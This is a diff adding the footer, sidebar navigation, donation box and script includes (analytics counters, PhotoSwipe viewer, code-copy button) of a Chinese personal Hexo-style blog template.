+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
